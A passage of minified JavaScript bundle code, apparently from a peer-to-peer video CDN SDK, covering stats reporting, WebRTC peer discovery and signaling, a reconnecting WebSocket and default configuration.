                            var l = function e(t, n) {
                                t = ~~"0x".concat(t);
                                var o = a[t];
                                if (void 0 === e.UJLmyS) {
                                    ! function() {
                                        var e = "undefined" != typeof window ? window : "object" === (void 0 === r ? "undefined" : u(r)) && "object" === (void 0 === i ? "undefined" : u(i)) ? i : this;
                                        e.atob || (e.atob = function(e) {
                                            for (var t, n, r = String(e).replace(/=+$/, ""), i = 0, o = 0, s = ""; n = r.charAt(o++); ~n && (t = i % 4 ? 64 * t + n : n, i++ % 4) ? s += String.fromCharCode(255 & t >> (-2 * i & 6)) : 0) n = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(n);
                                            return s
                                        })
                                    }();
                                    var s = function(e, t) {
                                        var n, r = [],
                                            i = 0,
                                            o = "",
                                            s = "";
                                        e = atob(e);
                                        for (var a = 0, u = e.length; a < u; a++) s += "%" + ("00" + e.charCodeAt(a).toString(16)).slice(-2);
                                        e = decodeURIComponent(s);
                                        for (var l = 0; l < 256; l++) r[l] = l;
                                        for (l = 0; l < 256; l++) i = (i + r[l] + t.charCodeAt(l % t.length)) % 256, n = r[l], r[l] = r[i], r[i] = n;
                                        l = 0, i = 0;
                                        for (var c = 0; c < e.length; c++) l = (l + 1) % 256, i = (i + r[l]) % 256, n = r[l], r[l] = r[i], r[i] = n, o += String.fromCharCode(e.charCodeAt(c) ^ r[(r[l] + r[i]) % 256]);
                                        return o
                                    };
                                    e.amGtZD = s, e.qlEmAJ = {}, e.UJLmyS = !![]
                                }
                                var l = e.qlEmAJ[t];
                                return void 0 === l ? (void 0 === e.CjmTAl && (e.CjmTAl = !![]), o = e.amGtZD(o, n), e.qlEmAJ[t] = o) : o = l, o
                            }
                        }
                    }, {
                        key: "postStats",
                        value: function() {
                            var e = this,
                                t = this.engine.logger;
                            fetch(this.statsURL, {
                                method: "POST",
                                body: JSON.stringify(this._makeStatsBody())
                            }).then(function(e) {
                                return e.json()
                            }).then(function(t) {
                                if (-1 === t.ret) clearInterval(e.heartbeater), e.engine.emit(v.default.RESTART_P2P);
                                else {
                                    var n = e.lastStats || {},
                                        r = n.http,
                                        i = void 0 === r ? 0 : r,
                                        o = n.p2p,
                                        s = void 0 === o ? 0 : o,
                                        a = n.share,
                                        u = void 0 === a ? 0 : a,
                                        l = n.conns,
                                        c = void 0 === l ? 0 : l,
                                        f = n.failConns,
                                        d = void 0 === f ? 0 : f,
                                        h = n.errsBufStalled,
                                        g = void 0 === h ? 0 : h,
                                        p = n.errsInternalExpt,
                                        y = void 0 === p ? 0 : p;
                                    e[w] >= i && (e[w] -= i), e[S] >= s && (e[S] -= s), e[C] >= u && (e[C] -= u), e.conns -= c, e.failConns >= d && (e.failConns -= d), e.errsBufStalled >= g && (e.errsBufStalled -= g), e.errsInternalExpt >= y && (e.errsInternalExpt -= y), e.exptMsg && (e.exptMsg = void 0)
                                }
                            }).catch(function(n) {
                                t.error("btStats error " + n), ++e.reportFails >= 2 && clearInterval(e.heartbeater)
                            })
                        }
                    }, {
                        key: "btGetPeers",
                        value: function(e) {
                            var t = this,
                                n = this.engine.logger;
                            return new Promise(function(r, i) {
                                fetch(t.getPeersURL, {
                                    headers: t._requestHeader,
                                    method: "POST",
                                    body: JSON.stringify({
                                        exclusions: e
                                    })
                                }).then(function(e) {
                                    return e.json()
                                }).then(function(e) {
                                    -1 === e.ret ? i(new Error(e.data.msg)) : r(e.data)
                                }).catch(function(e) {
                                    n.error("btGetPeers error " + e), i(e)
                                })
                            })
                        }
                    }, {
                        key: "increConns",
                        value: function() {
                            this.conns++
                        }
                    }, {
                        key: "decreConns",
                        value: function() {
                            this.conns--
                        }
                    }, {
                        key: "increFailConns",
                        value: function() {
                            this.failConns++
                        }
                    }, {
                        key: "reportFlow",
                        value: function(e) {
                            var t = Math.round(e / 1024);
                            this[w] += t, this.totalHTTPDownloaded += t, this._emitStats()
                        }
                    }, {
                        key: "reportDCTraffic",
                        value: function(e, t) {
                            var n = Math.round(e / 1024);
                            this[S] += n, this.totalP2PDownloaded += n, this.speed = Math.round(t), this._emitStats()
                        }
                    }, {
                        key: "reportUploaded",
                        value: function() {
                            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
                            this.totalP2PUploaded += Math.round(e / 1024), this[C] += Math.round(e / 1024), this._emitStats()
                        }
                    }, {
                        key: "destroy",
                        value: function() {
                            this.engine.logger.warn("destroy fetcher"), clearInterval(this.heartbeater), clearTimeout(this.bl), this.ropeWs && (this.ropeWs.destroy(), this.ropeWs = null)
                        }
                    }, {
                        key: "_emitStats",
                        value: function() {
                            this.engine.emit("stats", {
                                totalHTTPDownloaded: this.totalHTTPDownloaded,
                                totalP2PDownloaded: this.totalP2PDownloaded,
                                totalP2PUploaded: this.totalP2PUploaded,
                                p2pDownloadSpeed: this.speed
                            });
                            var e = this.engine.config.getStats;
                            e && "function" == typeof e && e(this.totalP2PDownloaded, this.totalP2PUploaded, this.totalHTTPDownloaded, this.speed)
                        }
                    }, {
                        key: "_makeStatsBody",
                        value: function() {
                            var e = {
                                conns: this.conns,
                                failConns: this.failConns,
                                errsBufStalled: this.errsBufStalled,
                                errsInternalExpt: this.errsInternalExpt,
                                http: Math.round(this[w]) || 0,
                                p2p: Math.round(this[S]) || 0,
                                share: Math.round(this[C]) || 0
                            };
                            return this.lastStats = JSON.parse(JSON.stringify(e)), Object.keys(e).forEach(function(t) {
                                0 === e[t] && delete e[t]
                            }), this.exptMsg && (e.exptMsg = b + " " + this.exptMsg), e
                        }
                    }, {
                        key: "_requestHeader",
                        get: function() {
                            var e = {};
                            return this.native && (e.token = this.key), e
                        }
                    }]), e
                }();
            t.default = E, e.exports = t.default
        }).call(t, n(25), n(26))
    }, function(e, t) {
        function n() {
            throw new Error("setTimeout has not been defined")
        }

        function r() {
            throw new Error("clearTimeout has not been defined")
        }

        function i(e) {
            if (c === setTimeout) return setTimeout(e, 0);
            if ((c === n || !c) && setTimeout) return c = setTimeout, setTimeout(e, 0);
            try {
                return c(e, 0)
            } catch (t) {
                try {
                    return c.call(null, e, 0)
                } catch (t) {
                    return c.call(this, e, 0)
                }
            }
        }

        function o(e) {
            if (f === clearTimeout) return clearTimeout(e);
            if ((f === r || !f) && clearTimeout) return f = clearTimeout, clearTimeout(e);
            try {
                return f(e)
            } catch (t) {
                try {
                    return f.call(null, e)
                } catch (t) {
                    return f.call(this, e)
                }
            }
        }

        function s() {
            p && h && (p = !1, h.length ? g = h.concat(g) : v = -1, g.length && a())
        }

        function a() {
            if (!p) {
                var e = i(s);
                p = !0;
                for (var t = g.length; t;) {
                    for (h = g, g = []; ++v < t;) h && h[v].run();
                    v = -1, t = g.length
                }
                h = null, p = !1, o(e)
            }
        }

        function u(e, t) {
            this.fun = e, this.array = t
        }

        function l() {}
        var c, f, d = e.exports = {};
        ! function() {
            try {
                c = "function" == typeof setTimeout ? setTimeout : n
            } catch (e) {
                c = n
            }
            try {
                f = "function" == typeof clearTimeout ? clearTimeout : r
            } catch (e) {
                f = r
            }
        }();
        var h, g = [],
            p = !1,
            v = -1;
        d.nextTick = function(e) {
            var t = new Array(arguments.length - 1);
            if (arguments.length > 1)
                for (var n = 1; n < arguments.length; n++) t[n - 1] = arguments[n];
            g.push(new u(e, t)), 1 !== g.length || p || i(a)
        }, u.prototype.run = function() {
            this.fun.apply(null, this.array)
        }, d.title = "browser", d.browser = !0, d.env = {}, d.argv = [], d.version = "", d.versions = {}, d.on = l, d.addListener = l, d.once = l, d.off = l, d.removeListener = l, d.removeAllListeners = l, d.emit = l, d.prependListener = l, d.prependOnceListener = l, d.listeners = function(e) {
            return []
        }, d.binding = function(e) {
            throw new Error("process.binding is not supported")
        }, d.cwd = function() {
            return "/"
        }, d.chdir = function(e) {
            throw new Error("process.chdir is not supported")
        }, d.umask = function() {
            return 0
        }
    }, function(e, t) {
        var n;
        n = function() {
            return this
        }();
        try {
            n = n || Function("return this")() || (0, eval)("this")
        } catch (e) {
            "object" == typeof window && (n = window)
        }
        e.exports = n
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e) {
            if (Array.isArray(e)) {
                for (var t = 0, n = Array(e.length); t < e.length; t++) n[t] = e[t];
                return n
            }
            return Array.from(e)
        }

        function o(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function s(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function a(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var u = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            l = n(1),
            c = r(l),
            f = n(16),
            d = r(f),
            h = n(17),
            g = r(h),
            p = n(0),
            v = n(3),
            y = r(v),
            b = n(11),
            m = r(b),
            _ = n(10),
            P = r(_),
            w = n(8),
            S = r(w),
            C = 25,
            E = 15,
            k = function(e) {
                function t(e, n, r, i) {
                    o(this, t);
                    var a = s(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    return a.engine = e, a.logger = e.logger, a.config = i, a.connected = !1, a.scheduler = r, a.sequential = a.scheduler.sequential, a.DCMap = new Map, a.failedDCSet = new Set, a.signalerWs = null, a.fetcher = n, a.peers = [], a.minConns = 5, a.stuns = [], a.requestMorePeers = (0, m.default)(a._requestMorePeers, a), a.engine.maxConns = a.maxConns = S.default.isMobile() ? E : C, a.peersIncrement = 0, a.gotPeersFromTracker = !1, a.fuseRate = -1, i.showSlogan && "en" === (0, p.navLang)() && console.log("%cLet your viewers become your unlimitedly scalable CDN\n%c" + window.atob("aHR0cHM6Ly93d3cuY2RuYnllLmNvbS9lbg=="), "color: dodgerblue; padding:20px 0; font-size: x-large", "font-size: medium; padding-bottom:15px"), a
                }
                return a(t, e), u(t, [{
                    key: "resumeP2P",
                    value: function() {
                        var e = this,
                            t = this.engine;
                        this.fetcher.btAnnounce().then(function(n) {
                            if (e.logger.info("announce request response " + JSON.stringify(n)), e.scheduler) {
                                t.peerId = e.peerId = n.id, e.minConns = n.min_conns, n.share_only && e.scheduler.setShareOnly();
                                var r = n.peers;
                                e.scheduler.notifyPeersLoaded(r.length);
                                var i = t.netType;
                                (n.wifi_only || t.config.wifiOnly) && "wifi" !== i && "ethernet" !== i && (e.scheduler.downloadOnly = !0, e.logger.info("downloadOnly mode")), e.signalerWs = e._initSignalerWs(n.signal || e.config.wsSignalerAddr, n.token), 0 === r.length ? e.requestMorePeers() : e.peers = e._filterPeers(r), t.emit("peerId", e.peerId);
                                var o = t.config.getPeerId;
                                o && "function" == typeof o && o(e.peerId), n.stun && n.stun.length > 0 && (e.stuns = n.stun), n.debug && e.logger.enableDebug(), n.fuse_rate && (e.fuseRate = n.fuse_rate)
                            }
                        }).catch(function(n) {
                            e.logger.error(n), t.emit(y.default.EXCEPTION, (0, g.default)(n, "TRACKER_EXPT"))
                        })
                    }
                }, {
                    key: "stopP2P",
                    value: function() {
                        this.fetcher.destroy(), this.fetcher = null, this.requestMorePeers(!0), this.scheduler.destroy(), this.scheduler = null, this.signalerWs && (this.signalerWs.destroy(), this.signalerWs = null), this.peers = [];
                        var e = !0,
                            t = !1,
                            n = void 0;
                        try {
                            for (var r, i = this.DCMap.values()[Symbol.iterator](); !(e = (r = i.next()).done); e = !0) {
                                r.value.destroy()
                            }
                        } catch (e) {
                            t = !0, n = e
                        } finally {
                            try {
                                !e && i.return && i.return()
                            } finally {
                                if (t) throw n
                            }
                        }
                        this.DCMap.clear(), this.failedDCSet.clear(), this.logger.warn("tracker stop p2p")
                    }
                }, {
                    key: "destroy",
                    value: function() {
                        this.stopP2P(), this.removeAllListeners();
                        var e = this.config;
                        e.getStats = e.getPeerId = e.getPeersInfo = null, this.logger.warn("destroy tracker")
                    }
                }, {
                    key: "_filterPeers",
                    value: function(e) {
                        var t = [],
                            n = [].concat(i(this.DCMap.keys()), i(this.failedDCSet.keys()), [this.peerId]);
                        return e.filter(function(e) {
                            return !n.includes(e.id)
                        }).forEach(function(e) {
                            t.push({
                                id: e.id,
                                intermediator: e.intermediator
                            })
                        }), t
                    }
                }, {
                    key: "_tryConnectToAllPeers",
                    value: function() {
                        if (0 !== this.peers.length)
                            for (this.logger.info("try connect to " + this.peers.length + " peers"); this.peers.length > 0;) {
                                if (this.DCMap.size >= this.maxConns) {
                                    this.logger.debug("clear exceeded peers"), this.peers = [];
                                    break
                                }
                                var e = this.peers.shift();
                                this.logger.debug("new DataChannel " + e.id);
                                var t = e.intermediator;
                                this._createDatachannel(e.id, !0, t)
                            }
                    }
                }, {
                    key: "_setupDC",
                    value: function(e) {
                        var t = this;
                        e.on(y.default.DC_SIGNAL, function(n) {
                            var r = e.remotePeerId;
                            if (e.intermediator) {
                                var i = t.DCMap.get(e.intermediator);
                                if (i) {
                                    if (i.sendMsgSignal(r, t.peerId, n)) return
                                }
                            }
                            t.signalerWs.sendSignal(r, n)
                        }).on(y.default.DC_PEER_SIGNAL, function(n) {
                            var r = n.to_peer_id,
                                i = n.from_peer_id,
                                o = n.action;
                            if (r && i && o)
                                if (r !== t.peerId) {
                                    t.logger.info("relay signal for " + i);
                                    var s = t.DCMap.get(r);
                                    if (s) {
                                        if ("signal" !== o) return void s.sendMsgSignalReject(r, i, n.reason);
                                        if (s.sendMsgSignal(r, i, n.data)) return
                                    }
                                    e.sendMsgSignal(i, r)
                                } else "signal" === o ? t._handleSignalMsg(i, n, e.remotePeerId) : t._handSignalRejected(i, n)
                        }).on(y.default.DC_GET_PEERS, function() {
                            var n = (0, p.getCurrentTs)(),
                                r = t.scheduler.getPeers().filter(function(e) {
                                    return e.peersConnected < (e.mobileWeb ? E : C)
                                });
                            if (r && r.length > 0) {
                                var i = [];
                                r.forEach(function(r) {
                                    var o = n - r.timeJoin;
                                    r.remotePeerId !== e.remotePeerId && r.remotePeerId !== t.peerId && o > 30 && i.push({
                                        id: r.remotePeerId
                                    })
                                }), t.logger.info("send " + i.length + " peers to " + e.remotePeerId), e.sendPeers(i)
                            }
                        }).on(y.default.DC_PEERS, function(n) {
                            e.gotPeers = !0;
                            var r = n.peers;
                            if (r && r.length > 0) {
                                t.logger.info("receive " + r.length + " peers from " + e.remotePeerId), r.forEach(function(t) {
                                    t.intermediator = e.remotePeerId
                                }), t.peers = [].concat(i(t.peers), i(t._filterPeers(r).slice(0, 5))), t._tryConnectToAllPeers()
                            }
                        }).once(y.default.DC_ERROR, function(n) {
                            t.logger.info("datachannel " + e.channelId + " failed fatal " + n), t.scheduler && (t.scheduler.deletePeer(e), t._destroyAndDeletePeer(e.remotePeerId), t.requestMorePeers(), t.fetcher && (e.connected ? t.fetcher.decreConns() : t.fetcher.increFailConns(), n && t.failedDCSet.add(e.remotePeerId), t._doSignalFusing(t.scheduler.peersNum)))
                        }).once(y.default.DC_CLOSE, function() {
                            t.logger.info("datachannel " + e.channelId + " closed"), t.scheduler && (t.scheduler.deletePeer(e), t._doSignalFusing(t.scheduler.peersNum)), t._destroyAndDeletePeer(e.remotePeerId), t.failedDCSet.add(e.remotePeerId), t.requestMorePeers(), t.fetcher && t.fetcher.decreConns()
                        }).once(y.default.DC_OPEN, function() {
                            var n = t.scheduler.peersNum;
                            t.scheduler.handshakePeer(e);
                            var r = n >= t.minConns;
                            t.requestMorePeers(r), t.fetcher.increConns(), t.peersIncrement++, t._doSignalFusing(n + 1)
                        })
                    }
                }, {
                    key: "_doSignalFusing",
                    value: function(e) {
                        if (!(this.fuseRate <= 0)) {
                            var t = this.signalerWs.connected;
                            t && e >= this.fuseRate + 2 ? (this.logger.warn("reach fuseRate, report stats close signaler"), this.fetcher.conns > 0 && this.fetcher.postStats(), this.signalerWs.close()) : !t && e < this.fuseRate && (this.logger.warn("low conns, reconnect signaler"), this.signalerWs.reconnect())
                        }
                    }
                }, {
                    key: "_initSignalerWs",
                    value: function(e, t) {
                        var n = this,
                            r = e + "?id=" + this.peerId + "&p=web";
                        t && (r = r + "&token=" + t);
                        var i = new d.default(this.engine, r, this.config, 270, "signaler");
                        return i.onopen = function() {
                            n.connected = !0, n.engine.emit("serverConnected", !0), n._tryConnectToAllPeers()
                        }, i.onmessage = function(e) {
                            var t = e.action,
                                r = e.from_peer_id;
                            switch (t) {
                                case "signal":
                                    n._handleSignalMsg(r, e);
                                    break;
                                case "reject":
                                    n._handSignalRejected(r, e);
                                    break;
                                case "close":
                                    n.logger.warn("server close signaler reason " + e.reason), i.close();
                                    break;
                                default:
                                    n.logger.warn("Signal websocket unknown action " + t)
                            }
                        }, i.onclose = function() {
                            n.connected = !1, n.engine.emit("serverConnected", !1)
                        }, i.onerror = function(e) {
                            e.message && n.engine.emit(y.default.EXCEPTION, (0, g.default)(e, "SIGNAL_EXPT"))
                        }, i
                    }
                }, {
                    key: "_handSignalRejected",
                    value: function(e, t) {
                        this.logger.warn("signaling " + e + " rejected, reason " + t.reason);
                        var n = this.DCMap.get(e);
                        n && !n.connected && (n.destroy(), this.DCMap.delete(e)), this.requestMorePeers(), t.fatal && this.failedDCSet.add(e)
                    }
                }, {
                    key: "_handleSignalMsg",
                    value: function(e, t, n) {
                        if (this.scheduler)
                            if (t.data) {
                                if (this.failedDCSet.has(e)) return void this._sendSignalReject(e, "peer " + e + " in blocked list", n, !0);
                                this.logger.debug("handle signal from " + e), this._handleSignal(e, t.data, n)
                            } else {
                                var r = this._destroyAndDeletePeer(e);
                                if (!r) return;
                                this.logger.info("signaling " + e + " not found");
                                var i = this.scheduler;
                                i.waitForPeer && 0 === --i.waitingPeers && i.notifyPeersLoaded(0), this.requestMorePeers()
                            }
                    }
                }, {
                    key: "_handleSignal",
                    value: function(e, t, n) {
                        var r = t.type,
                            i = this.logger,
                            o = this.DCMap.get(e);
                        if (o) {
                            if (o.connected) return void i.info("datachannel had connected, signal ignored");
                            if ("offer" === r) {
                                if (!(this.peerId > e)) return void i.warn("signal type wrong " + r + ", ignored");
                                this._destroyAndDeletePeer(e), i.warn("signal type wrong " + r + ", convert to non initiator"), o = this._createDatachannel(e, !1, n)
                            }
                        } else {
                            if ("answer" === r) {
                                var s = "signal type wrong " + r;
                                return i.warn(s), this._sendSignalReject(e, s, n), void this._destroyAndDeletePeer(e)
                            }
                            i.debug("receive node " + e + " connection request");
                            var a = this.scheduler.peersNum;
                            if (a >= this.maxConns) {
                                var u = this.scheduler.getNonactivePeers();
                                if (!(u.length > 0)) {
                                    var l = "peers reach limit " + this.maxConns;
                                    return i.warn(l), void this._sendSignalReject(e, l, n)
                                }
                                var c = a - this.maxConns + 2;
                                for (u.length < c && (c = u.length); c > 0;) {
                                    var f = u.shift();
                                    f && (i.warn("close inactive peer " + f.remotePeerId), f.close()), c--
                                }
                            }
                            o = this._createDatachannel(e, !1, n)
                        }
                        o.receiveSignal(t)
                    }
                }, {
                    key: "_createDatachannel",
                    value: function(e, t, n) {
                        var r = this.config.trickleICE;
                        this.scheduler.waitForPeer && (r = !0);
                        var i = new P.default(this.engine, this.peerId, e, t, this.config, this.sequential, {
                            stuns: this.stuns,
                            intermediator: n,
                            trickle: r
                        });
                        return this.DCMap.set(e, i), this._setupDC(i), i
                    }
                }, {
                    key: "_sendSignalReject",
                    value: function(e, t, n, r) {
                        if (n) {
                            var i = this.DCMap.get(n);
                            if (i && i.sendMsgSignalReject(e, this.peerId, t, r)) return
                        }
                        this.signalerWs.sendReject(e, t, r)
                    }
                }, {
                    key: "_requestMorePeers",
                    value: function(e) {
                        var t = this,
                            n = this.logger;
                        n.info("requestMorePeers after delay " + e);
                        var r = this.scheduler.peersNum,
                            o = this.peersIncrement;
                        this.peersIncrement = 0, r >= this.minConns || (0 === r || o <= 3 && !this.gotPeersFromTracker ? (this.failedDCSet.size > 30 && (this.failedDCSet = new Set([].concat(i(this.failedDCSet)).slice(-30))), this.fetcher.btGetPeers([].concat(i(this.DCMap.keys()), i(this.failedDCSet.keys()))).then(function(e) {
                            n.info("requestMorePeers resp " + JSON.stringify(e)), t.peers = [].concat(i(t.peers), i(t._filterPeers(e.peers))), t._tryConnectToAllPeers()
                        }).catch(function(e) {
                            n.error("requestMorePeers error " + e)
                        }), this.gotPeersFromTracker = !0) : r < this.maxConns && (this.scheduler.requestPeers(), this.gotPeersFromTracker = !1))
                    }
                }, {
                    key: "_destroyAndDeletePeer",
                    value: function(e) {
                        var t = this.DCMap.get(e);
                        return !!t && (t.destroy(), this.DCMap.delete(e), !0)
                    }
                }]), t
            }(c.default);
        t.default = k, e.exports = t.default
    }, function(e, t, n) {
        "use strict";
        var r = function(e) {
                return e && 2 === e.CLOSING
            },
            i = function() {
                return "undefined" != typeof WebSocket && r(WebSocket)
            },
            o = function() {
                return {
                    constructor: i() ? WebSocket : null,
                    maxReconnectionDelay: 1e4,
                    minReconnectionDelay: 1500,
                    reconnectionDelayGrowFactor: 1.3,
                    connectionTimeout: 4e3,
                    maxRetries: 1 / 0,
                    debug: !1
                }
            },
            s = function(e, t, n) {
                Object.defineProperty(t, n, {
                    get: function() {
                        return e[n]
                    },
                    set: function(t) {
                        e[n] = t
                    },
                    enumerable: !0,
                    configurable: !0
                })
            },
            a = function(e) {
                return e.minReconnectionDelay + Math.random() * e.minReconnectionDelay
            },
            u = function(e, t) {
                var n = t * e.reconnectionDelayGrowFactor;
                return n > e.maxReconnectionDelay ? e.maxReconnectionDelay : n
            },
            l = ["onopen", "onclose", "onmessage", "onerror"],
            c = function(e, t, n) {
                Object.keys(n).forEach(function(t) {
                    n[t].forEach(function(n) {
                        var r = n[0],
                            i = n[1];
                        e.addEventListener(t, r, i)
                    })
                }), t && l.forEach(function(n) {
                    e[n] = t[n]
                })
            },
            f = function(e, t, n) {
                var i = this;
                void 0 === n && (n = {});
                var l, d, h = 0,
                    g = 0,
                    p = !0,
                    v = null,
                    y = {};
                if (!(this instanceof f)) throw new TypeError("Failed to construct 'ReconnectingWebSocket': Please use the 'new' operator");
                var b = o();
                if (Object.keys(b).filter(function(e) {
                        return n.hasOwnProperty(e)
                    }).forEach(function(e) {
                        return b[e] = n[e]
                    }), !r(b.constructor)) throw new TypeError("Invalid WebSocket constructor. Set `options.constructor`");
                var m = b.debug ? function() {
                        for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
                        return console.log.apply(console, ["RWS:"].concat(e))
                    } : function() {},
                    _ = function(e, t) {
                        return setTimeout(function() {
                            var n = new Error(t);
                            n.code = e, Array.isArray(y.error) && y.error.forEach(function(e) {
                                return (0, e[0])(n)
                            }), l.onerror && l.onerror(n)
                        }, 0)
                    },
                    P = function() {
                        if (m("handleClose", {
                                shouldRetry: p
                            }), g++, m("retries count:", g), g > b.maxRetries) return void _("EHOSTDOWN", "Too many failed connection attempts");
                        h = h ? u(b, h) : a(b), m("handleClose - reconnectDelay:", h), p && setTimeout(w, h)
                    },
                    w = function() {
                        if (p) {
                            m("connect");
                            var n = l,
                                r = "function" == typeof e ? e() : e;
                            l = new b.constructor(r, t), d = setTimeout(function() {
                                m("timeout"), l.close(), _("ETIMEDOUT", "Connection timeout")
                            }, b.connectionTimeout), m("bypass properties");
                            for (var o in l)["addEventListener", "removeEventListener", "close", "send"].indexOf(o) < 0 && s(l, i, o);
                            l.addEventListener("open", function() {
                                clearTimeout(d), m("open"), h = a(b), m("reconnectDelay:", h), g = 0
                            }), l.addEventListener("close", P), c(l, n, y), l.onclose = l.onclose || v, v = null
                        }
                    };
                m("init"), w(), this.close = function(e, t, n) {
                    void 0 === e && (e = 1e3), void 0 === t && (t = "");
                    var r = void 0 === n ? {} : n,
                        i = r.keepClosed,
                        o = void 0 !== i && i,
                        s = r.fastClose,
                        a = void 0 === s || s,
                        u = r.delay,
                        c = void 0 === u ? 0 : u;
                    if (m("close - params:", {
                            reason: t,
                            keepClosed: o,
                            fastClose: a,
                            delay: c,
                            retriesCount: g,
                            maxRetries: b.maxRetries
                        }), p = !o && g <= b.maxRetries, c && (h = c), l.close(e, t), a) {
                        var f = {
                            code: e,
                            reason: t,
                            wasClean: !0
                        };
                        P(), l.removeEventListener("close", P), Array.isArray(y.close) && y.close.forEach(function(e) {
                            var t = e[0],
                                n = e[1];
                            t(f), l.removeEventListener("close", t, n)
                        }), l.onclose && (v = l.onclose, l.onclose(f), l.onclose = null)
                    }
                }, this.send = function(e) {
                    l.send(e)
                }, this.addEventListener = function(e, t, n) {
                    Array.isArray(y[e]) ? y[e].some(function(e) {
                        return e[0] === t
                    }) || y[e].push([t, n]) : y[e] = [
                        [t, n]
                    ], l.addEventListener(e, t, n)
                }, this.removeEventListener = function(e, t, n) {
                    Array.isArray(y[e]) && (y[e] = y[e].filter(function(e) {
                        return e[0] !== t
                    })), l.removeEventListener(e, t, n)
                }
            };
        e.exports = f
    }, function(e, t, n) {
        "use strict";
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var r = {
            wsMaxRetries: 10,
            p2pEnabled: !0,
            wifiOnly: !1,
            memoryCacheLimit: {
                pc: 536870912,
                mobile: 268435456
            },
            dcDownloadTimeout: 25,
            logLevel: "error",
            tag: "",
            webRTCConfig: {},
            token: "",
            appName: void 0,
            appId: void 0,
            prefetchNum: 8,
            channelIdPrefix: "",
            showSlogan: !0,
            trickleICE: !0,
            simultaneousTargetPeers: 2
        };
        r.validateSegment = function(e, t) {
            return !0
        }, r.getStats = function(e, t, n) {}, r.getPeerId = function(e) {}, r.getPeersInfo = function(e) {}, t.default = r, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e) {
            if (Array.isArray(e)) {
                for (var t = 0, n = Array(e.length); t < e.length; t++) n[t] = e[t];
                return n
            }
            return Array.from(e)
        }

        function o(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function s(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function a(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var u = function() {
                function e(e, t) {
                    var n = [],
                        r = !0,
                        i = !1,
                        o = void 0;
                    try {
                        for (var s, a = e[Symbol.iterator](); !(r = (s = a.next()).done) && (n.push(s.value), !t || n.length !== t); r = !0);
                    } catch (e) {
                        i = !0, o = e
                    } finally {
                        try {
                            !r && a.return && a.return()
                        } finally {
                            if (i) throw o
                        }
                    }
                    return n
                }
                return function(t, n) {
                    if (Array.isArray(t)) return t;
                    if (Symbol.iterator in Object(t)) return e(t, n);
                    throw new TypeError("Invalid attempt to destructure non-iterable instance")
                }
            }(),
            l = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            c = n(1),
            f = r(c),
            d = n(3),
            h = r(d),
            g = n(18),
            p = r(g),
            v = n(0),
            y = n(31),
            b = r(y),
            m = Symbol("shareOnly"),
            _ = function(e) {
                function t(e, n) {
                    o(this, t);
                    var r = s(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    return r.engine = e, r.config = n, r.logger = e.logger, r.bitset = new Set, r.bitCounts = new Map, r.bufMgr = null, r.peerManager = new p.default, r.requestingMap = new b.default, r._setupEngine(), r.loadedPeerNum = 0, r.startCheckConnsTimer(), r.dcDownloadTimeout = n.dcDownloadTimeout, r[m] = !1, r.downloadOnly = !1, r
                }
                return a(t, e), l(t, [{
                    key: "startCheckConnsTimer",
                    value: function() {
                        var e = this;
                        this.checkConnsTimer = setInterval(function() {
                            e.logger.info("start check conns");
                            var t = e.peersNum,
                                n = e.subscribers,
                                r = n && n.length > 0 ? n.length : void 0,
                                i = !0,
                                o = !1,
                                s = void 0;
                            try {
                                for (var a, u = e.peerManager.getPeerValues()[Symbol.iterator](); !(i = (a = u.next()).done); i = !0) {
                                    var l = a.value;
                                    l.connected && l.sendMsgStats(t, r)
                                }
                            } catch (e) {
                                o = !0, s = e
                            } finally {
                                try {
                                    !i && u.return && u.return()
                                } finally {
                                    if (o) throw s
                                }
                            }
                        }, 5e4)
                    }
                }, {
                    key: "getNonactivePeers",
                    value: function() {
                        var e = (0, v.getCurrentTs)(),
                            t = [],
                            n = !0,
                            r = !1,
                            i = void 0;
                        try {
                            for (var o, s = this.peerManager.getPeerValues()[Symbol.iterator](); !(n = (o = s.next()).done); n = !0) {
                                var a = o.value;
                                e - a.dataExchangeTs > 120 && t.push(a)
                            }
                        } catch (e) {
                            r = !0, i = e
                        } finally {
                            try {
                                !n && s.return && s.return()
                            } finally {
                                if (r) throw i
                            }
                        }
                        return t.length > 0 && t.sort(function(e, t) {
